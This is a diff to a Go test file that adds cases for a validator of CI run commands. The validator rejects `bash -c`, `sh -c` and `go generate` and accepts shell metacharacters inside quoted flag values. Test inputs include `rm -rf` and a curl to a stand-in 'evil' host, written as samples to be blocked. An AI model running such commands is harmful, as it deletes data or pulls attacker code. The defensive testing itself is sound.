@@ -54,6 +54,31 @@ func TestIsSingleInvocationRejectsShellOpsAndEval(t *testing.T) {
 	assert.False(t, IsSingleInvocation(""))
 }
 
+func TestIsSingleInvocationRejectsBashDashC(t *testing.T) {
+	// `bash -c`/`sh -c` is inline shell logic wearing an interpreter costume — the payload is
+	// opaque to the shellOps check, so it must be rejected on the `-c` flag itself.
+	assert.False(t, IsSingleInvocation(`bash -c "rm -rf /tmp/x"`))
+	assert.False(t, IsSingleInvocation(`sh -c "curl http://evil/install"`))
+	assert.False(t, IsSingleInvocation(`bash -euo pipefail -c "make evil"`))
+	assert.False(t, IsSingleInvocation(`bash -euxc "make evil"`))
+	assert.False(t, IsSingleInvocation(`bash --command "x"`))
+}
+
+func TestIsSingleInvocationRejectsGoGenerate(t *testing.T) {
+	// go generate runs arbitrary //go:generate directives — inline logic.
+	assert.False(t, IsSingleInvocation("go generate ./..."))
+}
+
+func TestIsSingleInvocationAcceptsQuotedMetachars(t *testing.T) {
+	// Shell metacharacters INSIDE a quoted flag value are data, not logic — must not false-positive.
+	assert.True(t, IsSingleInvocation(`go run ./x --msg="a > b"`))
+	assert.True(t, IsSingleInvocation(`bazelisk run //x -- --template='<div>'`))
+	assert.True(t, IsSingleInvocation(`bazelisk run //x -- --fmt='a|b'`))
+	assert.True(t, IsSingleInvocation(`bazelisk run //x -- --sep='a;b'`))
+	// The env-var transport the composite actions use for untrusted inputs.
+	assert.True(t, IsSingleInvocation(`bazelisk run //actions/lint -- --paths="$LINT_PATHS"`))
+}
+
 func TestInlineErrorsFlagsBlockScalarsAndEmptyRun(t *testing.T) {
 	assert.Len(t, InlineErrors("steps:\n  - run: |\n      echo hi\n      ls\n", AllowNames), 1)
 	assert.Len(t, InlineErrors("steps:\n  - run: >\n      echo hi\n", AllowNames), 1)
